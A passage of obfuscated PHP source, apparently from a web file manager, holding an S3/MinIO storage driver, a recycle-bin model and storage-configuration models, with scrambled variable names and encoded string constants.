($Ëù€Ÿ‚) { if (!empty($€ÚÓŠä×)) { if (count($€ÚÓŠä×) > 1 || isset($€ÚÓŠä×[0][$”ôË¬Çü[32]]) && $€ÚÓŠä×[0][$”ôË¬Çü[32]] != $›ˆ¬—şé) { return !0; } } } else { if (!empty($Í³Ó¬şŸ)) { return !0; } } if ($›óÙõ€ === null) { break; } } if ($şöÜıÎä) { $©ş©¨—Ñ = array_diff($©ş©¨—Ñ, array($›ˆ¬—şé)); $©ş©¨—Ñ = count(array_unique($©ş©¨—Ñ)); $£Û¤ÉÖ« = count(array_unique($£Û¤ÉÖ«)); return array($”ôË¬Çü[207] => $©ş©¨—Ñ, $”ôË¬Çü[208] => $£Û¤ÉÖ«); } return !1; } public function listAll($ŞĞâ¸) { $âÓİ‰¿¸ =& $_SERVER[ñˆ‹ß¿÷]; $©û¦ã°‰ = $this->fileList($ŞĞâ¸, $âÓİ‰¿¸[12], !0); $²ğ¢´Ÿ° = array(); foreach ($©û¦ã°‰[$âÓİ‰¿¸[83]] as $ÎŠÏı´ã) { $²ğ¢´Ÿ°[$ÎŠÏı´ã[$âÓİ‰¿¸[32]]] = $ÎŠÏı´ã[$âÓİ‰¿¸[76]]; } foreach ($©û¦ã°‰[$âÓİ‰¿¸[82]] as $ÎŠÏı´ã) { if (is_string($ÎŠÏı´ã)) { $²ğ¢´Ÿ°[$ÎŠÏı´ã] = 0; } } return $this->listAllFiles($ŞĞâ¸, array_keys($²ğ¢´Ÿ°), $²ğ¢´Ÿ°); } public function canRead($ÉâÉğï) { $á“é©ÜÖ =& $_SERVER[ñˆ‹ß¿÷]; $õóÀ¯ÈÓ = $this->client->getAccessControlPolicy($this->bucket, $ÉâÉğï); if (!$õóÀ¯ÈÓ) { return !1; } return in_array($õóÀ¯ÈÓ, array($á“é©ÜÖ[209], $á“é©ÜÖ[210], $á“é©ÜÖ[211])) ? !0 : !1; } public function canWrite($…«¾öˆ) { $ÏĞóÌó =& $_SERVER[ñˆ‹ß¿÷]; $ïÉÒñÕ” = $this->client->getAccessControlPolicy($this->bucket, $…«¾öˆ); if (!$ïÉÒñÕ”) { return !1; } return in_array($ïÉÒñÕ”, array($ÏĞóÌó[209], $ÏĞóÌó[210])) ? !0 : !1; } public function getContent($‚²•æ›€) { return $this->client->getObject($this->bucket, $‚²•æ›€); } public function setContent($ø’Ç–Ã”, $‹‹¸ÄÃ = '', $§²ÙİœŸ = false) { $‘ª™Ó˜¼ =& $_SERVER[ñˆ‹ß¿÷]; $ø’Ç–Ã” = $§²ÙİœŸ ? trim($ø’Ç–Ã”, $‘ª™Ó˜¼[8]) . $‘ª™Ó˜¼[8] : $ø’Ç–Ã”; $€«Ä‰ïå = get_file_mime(get_path_ext($ø’Ç–Ã”)); $Æûö¦› = $this->client->putObject($‹‹¸ÄÃ, $this->bucket, $ø’Ç–Ã”, $‘ª™Ó˜¼[198], array(), $€«Ä‰ïå); if (!$Æûö¦›) { return !1; } if ($§²ÙİœŸ) { return !0; } $this->cacheMethod(null, null); $Æûö¦› = $this->copyFile($ø’Ç–Ã”, $ø’Ç–Ã”, array($‘ª™Ó˜¼[212] => $Æûö¦›[$‘ª™Ó˜¼[213]])); return $Æûö¦› ? !0 : !1; } public function fileSubstr($ôË€Õ, $–šÉûâë, $¹òˆôÑ) { $Ìô‘ñ» = $–šÉûâë + $¹òˆôÑ - 1; return $this->client->getObject($this->bucket, $ôË€Õ, array($_SERVER[ñˆ‹ß¿÷][214] => "\142\171\164\x65\x73\x3d{$–šÉûâë}\55{$Ìô‘ñ»}")); } public function upload($ı‹¸Ï¬†, $î«Óô‹», $©ãËÚÊ» = false, $§®Íœ¢Å = REPEAT_REPLACE) { $—âÃÄ‰† =& $_SERVER[ñˆ‹ß¿÷]; $Ê¿Îü¢Ü = array($—âÃÄ‰†[212] => @md5_file($î«Óô‹»)); $»ÍİÏâ° = array($—âÃÄ‰†[215] => get_file_mime(get_path_ext($ı‹¸Ï¬†))); if (IO::size($î«Óô‹») <= 1024 * 1024 * 200) { $ÍÛÉÏ = $this->client->putObjectFile($î«Óô‹», $this->bucket, $ı‹¸Ï¬†, $—âÃÄ‰†[198], $Ê¿Îü¢Ü, $»ÍİÏâ°); return !empty($ÍÛÉÏ) ? $this->getPathOuter($ı‹¸Ï¬†) : !1; } $Öİ²Õò = $this->client->multiUploadObject($î«Óô‹», $this->bucket, trim($ı‹¸Ï¬†, $—âÃÄ‰†[8]), $Ê¿Îü¢Ü, $»ÍİÏâ°); return $Öİ²Õò ? $this->getPathOuter($ı‹¸Ï¬†) : !1; } public function download($‘‹ûïŸ•, $Ô«ÌÆí¶) { if (!@is_dir($this->pathFather($Ô«ÌÆí¶)) && !IO::mkdir($this->pathFather($Ô«ÌÆí¶))) { return !1; } $ÑÔŸÏ‘Ğ = $this->client->getObject($this->bucket, $‘‹ûïŸ•, array(), $Ô«ÌÆí¶); return $ÑÔŸÏ‘Ğ !== !1 ? $Ô«ÌÆí¶ : !1; } public function link($‡ÓºÃè‚, $º³×Ò°Œ = array()) { $Äâ¿½ßÁ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->signVer == $Äâ¿½ßÁ[216]) { return $this->client->getAuthenticatedURL($this->bucket, $‡ÓºÃè‚, 3600 * 12, $º³×Ò°Œ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($‡ÓºÃè‚, $Äâ¿½ßÁ[8]), 3600 * 12, $this->region, array(), !0, $º³×Ò°Œ); } public function fileOut($å¤¡Œ“½, $Ü´°Ê¢Î = false, $£ß—óÒµ = false, $ıœß×…ú = '') { $í×õı¹µ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($å¤¡Œ“½, $Ü´°Ê¢Î, $£ß—óÒµ, $ıœß×…ú); } if (!$£ß—óÒµ) { $£ß—óÒµ = $this->pathThis($å¤¡Œ“½); } $„ËŞÚÏŞ = get_file_mime(get_path_ext($£ß—óÒµ)); if ($„ËŞÚÏŞ == $í×õı¹µ[217]) { return parent::fileOut($å¤¡Œ“½, $Ü´°Ê¢Î, $£ß—óÒµ, $ıœß×…ú); } $ šôµ = array($í×õı¹µ[218] => $„ËŞÚÏŞ); if ($Ü´°Ê¢Î) { $ šôµ[$í×õı¹µ[219]] = $í×õı¹µ[220] . rawurlencode($£ß—óÒµ); } else { } $èãÊãì = $this->link($å¤¡Œ“½, $ šôµ); $this->fileOutLink($èãÊãì); } public function fileOutServer($µÎ÷£ù¸, $ó§è¿ = false, $›ÎùËı = false, $¬ïˆ÷¢Ã = '') { parent::fileOut($µÎ÷£ù¸, $ó§è¿, $›ÎùËı, $¬ïˆ÷¢Ã); } public function fileOutImageServer($©Œé», $ò¶§§œ = 250) { parent::fileOutImage($©Œé», $ò¶§§œ); } public function hashMd5($“‚—ç¤ , $½¢ã•ıÖ = '') { $®ÚÒóÃ“ =& $_SERVER[ñˆ‹ß¿÷]; $ˆ ×Õö´ = $this->objectMeta($“‚—ç¤ ); if (!$ˆ ×Õö´) { return !1; } $½¢ã•ıÖ = $½¢ã•ıÖ ? $½¢ã•ıÖ : _get($ˆ ×Õö´, $®ÚÒóÃ“[221]); $½¢ã•ıÖ = $½¢ã•ıÖ ? $½¢ã•ıÖ : _get($ˆ ×Õö´, $®ÚÒóÃ“[213], $®ÚÒóÃ“[12]); return $½¢ã•ıÖ; } public function uploadFormData($Í‰àˆòË, $Æî ò§á = 3600) { $†úŞ—¨‡ =& $_SERVER[ñˆ‹ß¿÷]; $È¯¯Èâ„ = $this->pathFather($Í‰àˆòË); $ØûÂ„â» = $this->client->getHttpUploadPostParams($this->bucket, $È¯¯Èâ„, $†úŞ—¨‡[198], $Æî ò§á); return array_merge((array) $ØûÂ„â», array($†úŞ—¨‡[181] => $this->getHost())); } public function multiUploadFormData($œ½ŸÏ÷à, $ù€–™Á¸ = 3600) { $ìˆ¼¬âŸ =& $_SERVER[ñˆ‹ß¿÷]; $•ÔÚ™‰ì = gmdate($ìˆ¼¬âŸ[222]); $õâ¶¨Š„ = array(); $ÖÚîà¹• = $this->client->getUploadId($this->bucket, $œ½ŸÏ÷à, $õâ¶¨Š„); if (!$ÖÚîà¹•) { return !1; } return array($ìˆ¼¬âŸ[223] => $ÖÚîà¹•, $ìˆ¼¬âŸ[181] => $this->getHost() . $ìˆ¼¬âŸ[8] . $this->pathEncode($œ½ŸÏ÷à), $ìˆ¼¬âŸ[224] => $•ÔÚ™‰ì, $ìˆ¼¬âŸ[94] => $œ½ŸÏ÷à); } public function multiUploadAuthData($Œ¬Ëù“, $¡¶–ˆ´÷ = array()) { $ØÀÚæğİ =& $_SERVER[ñˆ‹ß¿÷]; $ô¨Ÿ£Ï™ = isset($¡¶–ˆ´÷[$ØÀÚæğİ[224]]) ? $¡¶–ˆ´÷[$ØÀÚæğİ[224]] : gmdate($ØÀÚæğİ[222]); $Î»ÜÑ = isset($¡¶–ˆ´÷[$ØÀÚæğİ[174]]) ? $¡¶–ˆ´÷[$ØÀÚæğİ[174]] : $ØÀÚæğİ[12]; $ıÀ“Ìöí = $¡¶–ˆ´÷[$ØÀÚæğİ[94]]; unset($¡¶–ˆ´÷[$ØÀÚæğİ[94]]); if (isset($¡¶–ˆ´÷[$ØÀÚæğİ[225]])) { $¡¶–ˆ´÷[$ØÀÚæğİ[224]] = $ô¨Ÿ£Ï™; return $this->listUploadParts($ıÀ“Ìöí, $¡¶–ˆ´÷); } $Ë€ıË = array($ØÀÚæğİ[226], $ØÀÚæğİ[12], $ØÀÚæğİ[120], $ØÀÚæğİ[12], "\x78\x2d\141\155\172\x2d\144\141\x74\x65\x3a{$ô¨Ÿ£Ï™}", $ØÀÚæğİ[8] . $this->bucket . $ØÀÚæğİ[8] . $this->pathEncode($ıÀ“Ìöí) . $Î»ÜÑ); if (strpos($Î»ÜÑ, $ØÀÚæğİ[227]) === 0) { $Ë€ıË[0] = $ØÀÚæğİ[228]; } if (isset($¡¶–ˆ´÷[$ØÀÚæğİ[229]]) && $¡¶–ˆ´÷[$ØÀÚæğİ[229]] == $ØÀÚæğİ[230]) { $Ë€ıË[0] = $ØÀÚæğİ[230]; } $Á”à¯üä = implode($ØÀÚæğİ[231], $Ë€ıË); $¾‘êâ– = base64_encode(hash_hmac($ØÀÚæğİ[232], $Á”à¯üä, $this->secret, !0)); $Ôì°µÅ‹ = $ØÀÚæğİ[233] . $this->accessKey . $ØÀÚæğİ[4] . $¾‘êâ–; if (strpos($Î»ÜÑ, $ØÀÚæğİ[227]) === 0) { return array($ØÀÚæğİ[234] => $Ôì°µÅ‹, $ØÀÚæğİ[224] => $ô¨Ÿ£Ï™); } return $Ôì°µÅ‹; } public function listUploadParts($‘é£İø‰, $£ïÔ‰Ü = array()) { $„ÏÙŒòÊ =& $_SERVER[ñˆ‹ß¿÷]; $ÌôŒ®ˆı = str_replace($„ÏÙŒòÊ[235], $„ÏÙŒòÊ[12], $£ïÔ‰Ü[$„ÏÙŒòÊ[174]]); $€ú²§êæ = $this->client->listParts($this->bucket, $‘é£İø‰, $ÌôŒ®ˆı); if (!$€ú²§êæ) { return !1; } unset($£ïÔ‰Ü[$„ÏÙŒòÊ[225]], $£ïÔ‰Ü[$„ÏÙŒòÊ[229]]); $£ïÔ‰Ü[$„ÏÙŒòÊ[94]] = $‘é£İø‰; $¤Îº¦Â¬ = $this->multiUploadAuthData($‘é£İø‰, $£ïÔ‰Ü); if (empty($¤Îº¦Â¬)) { return !1; } return array($„ÏÙŒòÊ[234] => $¤Îº¦Â¬, $„ÏÙŒòÊ[224] => $£ïÔ‰Ü[$„ÏÙŒòÊ[224]], $„ÏÙŒòÊ[236] => $€ú²§êæ); } public function getHost() { return parent::getHost() . $_SERVER[ñˆ‹ß¿÷][8] . $this->bucket; } public function size($¢İğòÂ) { $ŒÓà€ÑÛ = $this->objectMeta($¢İğòÂ); return $ŒÓà€ÑÛ ? $ŒÓà€ÑÛ[$_SERVER[ñˆ‹ß¿÷][76]] : 0; } public function info($É ñŠñÒ) { if ($this->isFolder($É ñŠñÒ)) { return $this->folderInfo($É ñŠñÒ); } else { if ($this->isFile($É ñŠñÒ)) { return $this->fileInfo($É ñŠñÒ); } } return !1; } public function exist($øìæÅÚ’) { return $this->isFile($øìæÅÚ’) || $this->isFolder($øìæÅÚ’); } public function isFile($÷ø™®) { return !$this->isFolder($÷ø™®) && $this->objectMeta($÷ø™®); } public function isFolder($µë€åøØ) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][165], $µë€åøØ); } protected function objectMeta($ƒ‘œ…ô) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][167], $ƒ‘œ…ô); } protected function _objectMeta($ˆç×ÊøÆ) { $·ñÆµ… =& $_SERVER[ñˆ‹ß¿÷]; $ˆç×ÊøÆ = rtrim($ˆç×ÊøÆ, $·ñÆµ…[8]); try { $ÇÖÙß£á = $this->client->getObjectInfo($this->bucket, $ˆç×ÊøÆ); if (!isset($ÇÖÙß£á[$·ñÆµ…[221]]) && isset($ÇÖÙß£á[$·ñÆµ…[237]])) { $ÇÖÙß£á[$·ñÆµ…[221]] = $ÇÖÙß£á[$·ñÆµ…[237]]; } } catch (Exception $Û¼€ÈÄª) { $ÇÖÙß£á = !1; } if (!$ÇÖÙß£á) { } return $ÇÖÙß£á; } protected function _isFolder($éÙıÑ¬“) { $³ÓÎœ¥Ÿ =& $_SERVER[ñˆ‹ß¿÷]; $éÙıÑ¬“ = rtrim($éÙıÑ¬“, $³ÓÎœ¥Ÿ[8]); if ($éÙıÑ¬“ == $³ÓÎœ¥Ÿ[12] || $éÙıÑ¬“ == $³ÓÎœ¥Ÿ[8]) { return !0; } $Ù¾°¼…µ = $this->client->getBucket($this->bucket, $éÙıÑ¬“, null, 1); if (empty($Ù¾°¼…µ[$³ÓÎœ¥Ÿ[204]])) { return !1; } $’£¡ä¼Ş = $Ù¾°¼…µ[$³ÓÎœ¥Ÿ[204]][0][$³ÓÎœ¥Ÿ[32]]; return stripos($’£¡ä¼Ş, $éÙıÑ¬“ . $³ÓÎœ¥Ÿ[8]) === 0 ? !0 : !1; if (substr($’£¡ä¼Ş, -1) == $³ÓÎœ¥Ÿ[8]) { return !0; } if (get_path_this($’£¡ä¼Ş) == get_path_this($éÙıÑ¬“)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($…¡˜¥×†) { parent::__construct($…¡˜¥×†); $this->signatureVersion($_SERVER[ñˆ‹ß¿÷][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto D•‹ÕŒ–‹’; EÍëº‚é÷¾: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\x65\137\162\145\143\x79\143\154\145"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\x69\x6d\145", "\x74\x69\155\145", "\x69\156\163\145\162\164", "\x66\165\x6e\143\x74\151\157\x6e")); public function listData($¼‡§Î£¾ = false) { $Â‘³ÉÈŠ =& $_SERVER[ñˆ‹ß¿÷]; $¼‡§Î£¾ = $¼‡§Î£¾ ? $¼‡§Î£¾ : USER_ID; $¾ƒ¾‹¢Ö = $this->where(array($Â‘³ÉÈŠ[1655] => $¼‡§Î£¾))->select(); return array_to_keyvalue($¾ƒ¾‹¢Ö, $Â‘³ÉÈŠ[12], $Â‘³ÉÈŠ[402]); } public function moveToRecycle($ê—²ËÃº) { $ª¹ß¹Øß =& $_SERVER[ñˆ‹ß¿÷]; $¶ÈË±€ä = Model($ª¹ß¹Øß[1334]); $èÀïŒÄ = $¶ÈË±€ä->sourceInfo($ê—²ËÃº); if (!$èÀïŒÄ || $èÀïŒÄ[$ª¹ß¹Øß[431]] == $ª¹ß¹Øß[88]) { return; } $×Î­‰§ = array($ª¹ß¹Øß[417] => $ê—²ËÃº, $ª¹ß¹Øß[1655] => USER_ID, $ª¹ß¹Øß[586] => $èÀïŒÄ[$ª¹ß¹Øß[411]], $ª¹ß¹Øß[587] => $èÀïŒÄ[$ª¹ß¹Øß[505]], $ª¹ß¹Øß[590] => $èÀïŒÄ[$ª¹ß¹Øß[521]]); $this->add($×Î­‰§); $this->recycleMove($ê—²ËÃº, 1); if ($èÀïŒÄ[$ª¹ß¹Øß[410]] == $ª¹ß¹Øß[88]) { $Ü¤¥Å¯à = array($ª¹ß¹Øß[590] => array($ª¹ß¹Øß[550], $èÀïŒÄ[$ª¹ß¹Øß[521]] . $ê—²ËÃº . $ª¹ß¹Øß[551])); $¶ÈË±€ä->where($Ü¤¥Å¯à)->setField($ª¹ß¹Øß[431], 1); } } public function clear() { $this->remove(!1); } public function remove($Ç™ëË• = false, $ÏÓ–‚Ü„ = false) { $¸ğÅşëì =& $_SERVER[ñˆ‹ß¿÷]; $ÏÓ–‚Ü„ = $ÏÓ–‚Ü„ ? $ÏÓ–‚Ü„ : USER_ID; $¸İ†â¸® = Model($¸ğÅşëì[1334]); $âÉ˜ëÏô = $this->listData($ÏÓ–‚Ü„); $Ç™ëË• = $Ç™ëË• === !1 ? !1 : $Ç™ëË•; $·Ä¥Ÿ = array(); foreach ($âÉ˜ëÏô as $Ø”º¦äş) { if ($Ç™ëË• != !1 && !in_array($Ø”º¦äş, $Ç™ëË•)) { continue; } $­»ıØë = $¸İ†â¸®->sourceInfo($Ø”º¦äş); $¸İ†â¸®->remove($Ø”º¦äş, !1); $ŸšÙ¥ë = $­»ıØë[$¸ğÅşëì[411]] . $¸ğÅşëì[11] . $­»ıØë[$¸ğÅşëì[505]]; $·Ä¥Ÿ[$ŸšÙ¥ë] = array($¸ğÅşëì[586] => $­»ıØë[$¸ğÅşëì[411]], $¸ğÅşëì[505] => $­»ıØë[$¸ğÅşëì[505]]); $this->where(array($¸ğÅşëì[402] => $Ø”º¦äş))->delete(); } foreach ($·Ä¥Ÿ as $ÛÌƒ¬) { $¸İ†â¸®->targetSpaceUpdate($ÛÌƒ¬[$¸ğÅşëì[411]], $ÛÌƒ¬[$¸ğÅşëì[505]]); } } public function restore($–†µœªØ = false) { $ôÙíã¬ = $this->listData(); $this->_restoreSource($ôÙíã¬, $–†µœªØ); } public function removeUserAll($°‹•ˆÊ) { $this->remove(!1, $°‹•ˆÊ); } private function _restoreSource($ğ°÷™¶Ò, $¸õİŒ™–) { $¸°´Ñß =& $_SERVER[ñˆ‹ß¿÷]; $¿ØşÆ£ò = Model($¸°´Ñß[1334]); $¸õİŒ™– = $¸õİŒ™– == !1 ? !1 : $¸õİŒ™–; if (!$ğ°÷™¶Ò) { return !0; } $Ú¹Ô´âÀ = array(); foreach ($ğ°÷™¶Ò as $¨ôù›©) { if ($¸õİŒ™– != !1 && !in_array($¨ôù›©, $¸õİŒ™–)) { continue; } $§¶ó° = $¿ØşÆ£ò->sourceInfo($¨ôù›©); $ëÀÎÇÚ = $¿ØşÆ£ò->sourceInfo($§¶ó°[$¸°´Ñß[432]]); if ($ëÀÎÇÚ[$¸°´Ñß[431]] == $¸°´Ñß[88]) { continue; } $¿ØşÆ£ò->lockMoveStart($¨ôù›©); $this->recycleMove($¨ôù›©, 0); if ($§¶ó°[$¸°´Ñß[410]] == $¸°´Ñß[88]) { $®Ô÷û×ˆ = array($¸°´Ñß[590] => array($¸°´Ñß[550], $§¶ó°[$¸°´Ñß[521]] . $¨ôù›© . $¸°´Ñß[551])); $¿ØşÆ£ò->where($®Ô÷û×ˆ)->setField($¸°´Ñß[431], 0); $this->restoreFolderChildren($¨ôù›©, $ğ°÷™¶Ò); } $this->where(array($¸°´Ñß[402] => $¨ôù›©))->delete(); $¿ØşÆ£ò->folderSizeReset($§¶ó°[$¸°´Ñß[432]]); $Ú¹Ô´âÀ[] = $§¶ó°[$¸°´Ñß[432]]; if ($§¶ó°[$¸°´Ñß[410]] == $¸°´Ñß[88]) { $Ú¹Ô´âÀ[] = $¨ôù›©; } $¿ØşÆ£ò->lockMoveEnd($¨ôù›©); } $¿ØşÆ£ò->updateModifyTime($Ú¹Ô´âÀ); } private function restoreFolderChildren($îı¸ÏÉê, $‚úÄ‘º) { $ºğà÷³¦ =& $_SERVER[ñˆ‹ß¿÷]; $ û¶Ç‹« = Model($ºğà÷³¦[1334]); $Ä¨¹ˆ»Ò = array($ºğà÷³¦[402] => array($ºğà÷³¦[7], array())); foreach ($‚úÄ‘º as $ÈÑîèÀ) { if ($ÈÑîèÀ == $îı¸ÏÉê) { continue; } if (!$ û¶Ç‹«->isParentOf($îı¸ÏÉê, $ÈÑîèÀ)) { continue; } $÷æ”û˜Ÿ = $ û¶Ç‹«->sourceInfo($ÈÑîèÀ); if ($÷æ”û˜Ÿ[$ºğà÷³¦[410]] == $ºğà÷³¦[88]) { $Ä¨¹ˆ»Ò[] = array($ºğà÷³¦[590] => array($ºğà÷³¦[550], $÷æ”û˜Ÿ[$ºğà÷³¦[521]] . $ÈÑîèÀ . $ºğà÷³¦[551])); } else { $Ä¨¹ˆ»Ò[$ºğà÷³¦[402]][1][] = $ÈÑîèÀ; } } if (!$Ä¨¹ˆ»Ò[$ºğà÷³¦[402]][1]) { unset($Ä¨¹ˆ»Ò[$ºğà÷³¦[402]]); } if (!$Ä¨¹ˆ»Ò) { return; } $Ä¨¹ˆ»Ò[$ºğà÷³¦[402]][1] = array_unique($Ä¨¹ˆ»Ò[$ºğà÷³¦[402]][1]); $Ä¨¹ˆ»Ò[$ºğà÷³¦[1007]] = $ºğà÷³¦[1934]; $ û¶Ç‹«->where($Ä¨¹ˆ»Ò)->setField($ºğà÷³¦[431], 1); } private function recycleMove($îæ ¨Ï”, $˜¤Îğ– = 1) { $Ø¦·Æ½ =& $_SERVER[ñˆ‹ß¿÷]; $™üÏ÷ùø = Model($Ø¦·Æ½[1334]); $Ôéúªœ = Model($Ø¦·Æ½[2146]); $Ë¡Ö•©± = array($Ø¦·Æ½[402] => $îæ ¨Ï”); if ($˜¤Îğ–) { $™üÏ÷ùø->where($Ë¡Ö•©±)->setField($Ø¦·Æ½[431], 1); $Ôéúªœ->eventRecycle($îæ ¨Ï”, $Ø¦·Æ½[2147]); } else { $¥Á’‚Âó = $™üÏ÷ùø->where($Ë¡Ö•©±)->find(); $¦³õµ‚± = $¥Á’‚Âó[$Ø¦·Æ½[410]] == $Ø¦·Æ½[88]; $Ëôœõâ = $™üÏ÷ùø->fileNameAuto($¥Á’‚Âó[$Ø¦·Æ½[432]], $¥Á’‚Âó[$Ø¦·Æ½[32]], REPEAT_RENAME_FOLDER, $¦³õµ‚±); if ($Ëôœõâ != $¥Á’‚Âó[$Ø¦·Æ½[32]]) { $™üÏ÷ùø->rename($îæ ¨Ï”, $Ëôœõâ); } $™üÏ÷ùø->where($Ë¡Ö•©±)->setField($Ø¦·Æ½[431], 0); $Ôéúªœ->eventRecycle($îæ ¨Ï”, $Ø¦·Æ½[2148]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\163\x6f\165\162\143\x65\x53\145\143\x72\145\164\x4c\x69\163\164"; public $field = array("\x73\157\165\x72\143\x65\111\104", "\x74\171\x70\x65\x49\104", "\143\x72\x65\x61\164\x65\x55\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x73\x74\157\x72\141\147\x65\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\163\x69\x7a\x65\x4d\141\x78", "\x73\171\163\164\x65\155", "\x64\x65\x66\x61\x75\154\164", "\x64\x72\x69\166\145\x72", "\143\157\156\146\151\147"); public function listData($¿¦ïğ±É = false, $É¸€àÍ = "\x6d\x6f\144\151\146\171\124\151\155\x65", $Î´íé‘ = false) { $ˆûÌø° =& $_SERVER[ñˆ‹ß¿÷]; $ÍÜîõ¹› = parent::listData($¿¦ïğ±É, $É¸€àÍ, $Î´íé‘); if ($¿¦ïğ±É) { return $ÍÜîõ¹›; } $Ö”¶Ãî² = $this->ioSizeUseGet(array_to_keyvalue($ÍÜîõ¹›, $ˆûÌø°[12], $ˆûÌø°[399])); foreach ($ÍÜîõ¹› as $Éö©‘Ş => $ô¤´øäò) { unset($ÍÜîõ¹›[$Éö©‘Ş][$ˆûÌø°[6]]); $ÍÜîõ¹›[$Éö©‘Ş][$ˆûÌø°[1825]] = isset($Ö”¶Ãî²[$ô¤´øäò[$ˆûÌø°[399]]]) ? $Ö”¶Ãî²[$ô¤´øäò[$ˆûÌø°[399]]] : 0; } return $ÍÜîõ¹›; } public function ioSizeUseGet($‰Ã»¦Œ) { $È† ËÒ =& $_SERVER[ñˆ‹ß¿÷]; if (!$‰Ã»¦Œ) { return array(); } $¬€ÏæÆ = $È† ËÒ[2149] . implode($È† ËÒ[50], $‰Ã»¦Œ); $–æ÷õ´á = Cache::get($¬€ÏæÆ); if ($–æ÷õ´á) { return $–æ÷õ´á; } $«†òÕ×– = array($È† ËÒ[824] => $È† ËÒ[399], $È† ËÒ[2150] => $È† ËÒ[76]); $çŞğĞ© = array($È† ËÒ[824] => array($È† ËÒ[7], $‰Ã»¦Œ)); $–æ÷õ´á = Model($È† ËÒ[796])->field($«†òÕ×–)->where($çŞğĞ©)->group($È† ËÒ[824])->select(); $–æ÷õ´á = array_to_keyvalue($–æ÷õ´á, $È† ËÒ[399], $È† ËÒ[76]); Cache::set($¬€ÏæÆ, $–æ÷õ´á, 600); return $–æ÷õ´á; } public function getConfig($×ÉÆ…‡‚) { $âÛ–Ã€¯ = parent::listData($×ÉÆ…‡‚); return json_decode($âÛ–Ã€¯[$_SERVER[ñˆ‹ß¿÷][6]], !0); } public function update($¥èƒ‰˜, $…›ÂÕš) { $ÄÀÓÏóÚ =& $_SERVER[ñˆ‹ß¿÷]; $Üäã˜É = $…›ÂÕš[$ÄÀÓÏóÚ[32]]; $ÂŞ’Ğâ™ = array_to_keyvalue(parent::listData(), $ÄÀÓÏóÚ[32]); if (isset($ÂŞ’Ğâ™[$Üäã˜É]) && $ÂŞ’Ğâ™[$Üäã˜É][$ÄÀÓÏóÚ[399]] != $¥èƒ‰˜) { return !1; } if (!empty($…›ÂÕš[$ÄÀÓÏóÚ[6]])) { $ÜÜ€¯ı¯ = json_decode($…›ÂÕš[$ÄÀÓÏóÚ[6]], !0); $íô†È¸÷ = isset($ÜÜ€¯ı¯[$ÄÀÓÏóÚ[2151]]) ? $ÄÀÓÏóÚ[2151] : (isset($ÜÜ€¯ı¯[$ÄÀÓÏóÚ[2152]]) ? $ÄÀÓÏóÚ[2152] : $ÄÀÓÏóÚ[12]); if ($íô†È¸÷) { $¶‘èö¿ = $this->getConfig($¥èƒ‰˜); $äı›ùÙö = $¶‘èö¿[$íô†È¸÷]; $¡øÀø£‚ = $ÜÜ€¯ı¯[$íô†È¸÷]; if ($¡øÀø£‚ == str_repeat($ÄÀÓÏóÚ[188], strlen($äı›ùÙö))) { $ÜÜ€¯ı¯[$íô†È¸÷] = $äı›ùÙö; } else { if ($¡øÀø£‚ != $äı›ùÙö) { $…›ÂÕš[$ÄÀÓÏóÚ[2153]] = $ÄÀÓÏóÚ[88]; } } } } if (isset($…›ÂÕš[$ÄÀÓÏóÚ[2153]]) && $…›ÂÕš[$ÄÀÓÏóÚ[2153]] == $ÄÀÓÏóÚ[88]) { $this->checkConfig($…›ÂÕš); } unset($…›ÂÕš[$ÄÀÓÏóÚ[2153]]); $’òˆÙéÔ = parent::update($¥èƒ‰˜, $…›ÂÕš); if ($’òˆÙéÔ && $…›ÂÕš[$ÄÀÓÏóÚ[37]]) { $ÈšÅÅ± = 0; foreach ($ÂŞ’Ğâ™ as $¢èÚè) { if ($¢èÚè[$ÄÀÓÏóÚ[37]] && $¢èÚè[$ÄÀÓÏóÚ[399]] != $¥èƒ‰˜) { $ÈšÅÅ± = $¢èÚè[$ÄÀÓÏóÚ[399]]; parent::update($¢èÚè[$ÄÀÓÏóÚ[399]], array($ÄÀÓÏóÚ[37] => 0)); } } $this->updateBackup($¥èƒ‰˜, $ÈšÅÅ±); } return $’òˆÙéÔ; } public function add($½¤•ºÊ) { $œªË±»ƒ =& $_SERVER[ñˆ‹ß¿÷]; $ƒ—‹“õã = array_to_keyvalue(parent::listData(), $œªË±»ƒ[32]); if (isset($ƒ—‹“õã[$½¤•ºÊ[$œªË±»ƒ[32]]])) { return !1; } $this->checkConfig($½¤•ºÊ); $ŒËîöÁÛ = parent::insert($½¤•ºÊ); if ($ŒËîöÁÛ && $½¤•ºÊ[$œªË±»ƒ[37]]) { foreach ($ƒ—‹“õã as $ºÒË¡ê¼) { if ($ºÒË¡ê¼[$œªË±»ƒ[37]]) { parent::update($ºÒË¡ê¼[$œªË±»ƒ[399]], array($œªË±»ƒ[37] => 0)); } } } return $ŒËîöÁÛ; } public function updateBackup($ÓâÂÖÄü, $°Şáö‚Ê) { $ä¨ëÂ¸ =& $_SERVER[ñˆ‹ß¿÷]; if (!$°Şáö‚Ê) { return; } $ŠãÂ¾ñË = Model($ä¨ëÂ¸[756])->config(); if ($ŠãÂ¾ñË[$ä¨ëÂ¸[1634]] != $ä¨ëÂ¸[88] || $ŠãÂ¾ñË[$ä¨ëÂ¸[759]] != $°Şáö‚Ê) { return; } $Şô´…½‰ = Model($ä¨ëÂ¸[777])->get($ä¨ëÂ¸[787]); $Şô´…½‰ = json_decode($Şô´…½‰, !0); if (!$Şô´…½‰) { return; } $Şô´…½‰[$ä¨ëÂ¸[759]] = $ÓâÂÖÄü; Model($ä¨ëÂ¸[777])->set(array($ä¨ëÂ¸[787] => $Şô´…½‰)); } public function checkConfig(&$â–‹ä¡È, $È©ìÌ°í = false) { $°•×ƒìà =& $_SERVER[ñˆ‹ß¿÷]; $ ú—–ª¾ = 